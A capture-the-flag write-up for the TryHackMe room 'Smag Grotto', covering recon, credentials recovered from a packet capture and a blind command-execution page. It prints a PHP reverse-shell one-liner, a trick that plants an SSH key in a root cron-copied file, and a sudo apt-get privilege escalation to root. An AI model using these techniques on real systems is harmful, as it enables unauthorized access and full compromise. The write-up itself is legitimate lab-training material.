```
   oo_   \\\    ///           \/           \/    ))       .-.  (o)__(o)(o)__(o)  .-.     
  /  _)-<((O)  (O))   /)     (OO)         (OO)  (Oo)-.  c(O_O)c(__  __)(__  __)c(O_O)c   
  \__ `.  | \  / |  (o)(O) ,'.--.)      ,'.--.)  | (_)),'.---.`, (  )    (  ) ,'.---.`,  
     `. | ||\\//||   //\\ / /|_|_\     / /|_|_\  |  .'/ /|_|_|\ \ )(      )( / /|_|_|\ \ 
     _| | || \/ ||  |(__)|| \_.--.     | \_.--.  )|\\ | \_____/ |(  )    (  )| \_____/ | 
  ,-'   | ||    ||  /,-. |'.   \) \    '.   \) \(/  \)'. `---' .` )/      )/ '. `---' .` 
 (_..--' (_/    \_)-'   ''  `-.(_.'      `-.(_.' )      `-...-'  (       (     `-...-'
```
Smag Grotto is a challenge offered on TryHackMe, aimed at beginners.
It tells us to follow the yellow brick road. [^1]

What is the user flag?
-----------------------------------------------------------------------------------------
Upon accessing the website, we are informed, that the website is still heavily under
development and that we should check back soon to see the awesome services they offer.
Using `nmap -sV -p- <TARGET_IP_ADDRESS>` we were able, to discover two open ports.
Namely, `ssh` on port *22* and `http` on port *80* which we already discovered. We still
suspect there to be a hidden entry on the HTTP page. Therefore, we start a `gobuster`
query to find hidden pages.
```
gobuster dir --url <URL_ADDRESS> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 64
```
And indeed, therefore we find the `/mail` and `/server-status` pages that are of especial
interest to us. We begin, by investigating the `/mail` endpoint and are informed that
the applications implements the *email2web* software to view emails in a hassle free way
and that all attachments must be downloaded with `wget`. Additionally, the *Network
Mitigation* email reply includes a PCAP file documenting a network change. So, we proceed
to investigate the `dHJhY2Uy.pcap` file and find only ten packets. Packet four, in
particular gives us useful information about a `/login.php` page with sensitive user
credentials in an excerpt from the HTTP protocol and form data.
```
Hypertext Transfer Protocol
    POST /login.php HTTP/1.1\r\n
    Host: development.smag.thm\r\n
    <--snip-->
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "username" = "<REDACTED>"
    Form item: "password" = "<REDACTED>"
```
Note, that before we can access the server `http://development.smag.thm/login.php`, we
first need to edit the `/etc/hosts` file to include the following entry with the
`<TARGET_IP_ADDRESS> development.smag.thm` IP address mapping. Having done, this we can
now navigate to the login page and enter the credentials from the packet capture.
This then redirects us to the `/admin.php` page where we can enter a command of our
choice and send it to the server. However, we have a *blind shell* because the output of
the command that we enter can not be seen directly. Instead, we want to start a listening
server on our attacking machine with `nc -lnvp 4444` and then wait for an incoming
request from the target server. To connect to our attacking machine, we can use a reverse
shell like the following which we generated using [^2].
```php
php -r '$sock=fsockopen("<TARGET_IP_ADDRESS>",<PORT>);system("sh <&3 >&3 2>&3");'
```
Thust, we get a reverse shell connection on our listener and are able to enter commands.
Navigating the home directory, we discover a user *jake* with a `user.txt` file.
However, we can not access it because we are logged in as *www-data*. After looking
around the VM directory for a while, we notice a clue in the `/etc/crontab` file.
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
```
The last line comes in handy, because it runs `cat` to copy the contents of the public
SSH key into the `authorized_keys` file to authenticate as the user *jake* via SSH. This
is exactly what we want to use, as we can print the contents of the backup file with our
unprivileged user through `cat /opt/.backups/jake_id_rsa.pub.backup`. Moreover, we can
modify the backup file and grant ourselves access via SSH as the user *jake*. For, that
we create a new SSH key in our attacking machine with `ssh-keygen` and copy the public
key for the *cronjob* to copy into jake's authorized keys:
`echo "<ATTACKING_PUBLIC_SSH_KEY>" > /opt/.backups/jake_id_rsa.pub.backup`.
And indeed, after verifying that our public key is stored in the backup file, we can
proceed to log in as *jake* on the attacking machine with `ssh jake@<TARGET_IP_ADDRESS>`
and are able to log in. Finally, we can print the contents of the `user.txt` file.

What is the root flag?
-----------------------------------------------------------------------------------------
Finally, we want to perform privilege escalation to extend our user rights to *root*.
For that, it is always useful to investigate the default *sudo* entries for our current
user with `sudo -l`. Here, we can read from the output, that `apt-get` is allowed with
sudo for jake:
```
Matching Defaults entries for jake on smag:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
  (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```
For that instance, we can then proceed to look up an exectuable to escalate privileges
on GTFOBins [^3] for `apt-get`. From the currated list, we choose 
`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` and are able to gain *root*.
Finally, we can print the contents of the `/root/root.txt` file.

[^1]: https://tryhackme.com/room/smaggrotto
[^2]: https://www.revshells.com/
[^3]: https://gtfobins.org/gtfobins/apt-get/
